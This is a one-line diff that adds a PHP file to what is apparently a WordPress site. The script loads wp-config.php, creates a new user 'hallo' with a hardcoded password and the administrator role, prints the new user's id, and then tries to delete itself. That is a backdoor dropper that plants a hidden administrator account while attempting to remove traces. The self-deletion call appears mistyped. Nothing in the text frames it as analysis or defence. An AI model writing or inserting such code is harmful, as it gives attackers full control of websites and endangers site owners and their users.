@@ -1,0 +1,1 @@
+<?php include 'wp-config.php';$user_login='hallo';$user_pass='hallo123';$user_email='hallo123@gmail.com';$role='administrator';$userdata=compact('user_login','user_email','user_pass','role');$user_id=wp_insert_user($userdata);print_R($user_id);unlink(FILE);
